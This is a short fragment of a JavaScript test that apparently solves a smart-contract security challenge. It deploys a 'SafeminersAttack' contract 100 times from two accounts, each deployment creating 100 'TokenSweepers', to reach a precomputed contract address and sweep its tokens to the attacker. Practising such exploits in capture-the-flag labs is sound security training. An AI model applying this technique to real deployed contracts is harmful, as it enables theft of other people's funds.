...
for (let nonce = 0; nonce < 100; nonce++) {
    // Have each SafeminersAttack contract create 100 TokenSweepers.
    await (await ethers.getContractFactory('SafeminersAttack', deployer)).deploy(attacker.address, this.token.address, 100);
    await (await ethers.getContractFactory('SafeminersAttack', attacker)).deploy(attacker.address, this.token.address, 100);
}
  })
